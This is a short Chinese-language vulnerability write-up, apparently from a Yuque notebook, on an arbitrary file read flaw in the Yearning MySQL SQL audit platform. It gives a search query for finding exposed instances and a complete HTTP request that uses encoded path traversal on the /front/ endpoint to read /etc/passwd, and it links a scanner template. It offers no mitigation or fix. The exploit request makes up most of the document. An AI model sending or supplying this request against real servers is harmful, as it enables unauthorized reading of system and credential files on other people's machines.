# Yearning front 接口存在任意文件读取漏洞

# 一、漏洞简介
Yearning是中国Henry Yee个人开发者的一个出色方便快捷的 Mysql SQL 审核平台。Yearning 2.3.1 版本、Interstellar GA 2.3.2 版本 和 Neptune 2.3.4 - 2.3.6 版本存在安全漏洞，该漏洞源于存在一个任意文件读取漏洞。攻击者可以利用该漏洞获取敏感信息。

# 二、影响版本
+ Yearning

# 三、资产测绘
+ hunter`app.name=="Yearning"`
+ 特征

![1704942004441-16159972-ed25-4bab-a118-7fbef2545a8f.png](./img/KycX1QqFLArvj1s9/1704942004441-16159972-ed25-4bab-a118-7fbef2545a8f-013917.png)

# 四、漏洞复现
```java
GET /front//%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd HTTP/2
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```

![1704942049555-f29e7a81-a72a-4237-b2a4-b988bd6e3857.png](./img/KycX1QqFLArvj1s9/1704942049555-f29e7a81-a72a-4237-b2a4-b988bd6e3857-921144.png)[yearning-front-readfile.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/1622799/1709222142312-c41a9525-b4d6-40ae-8332-da2f36609f9e.yaml)



> 更新: 2024-02-29 23:55:42  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/cvbgbkdvgfwckrxo>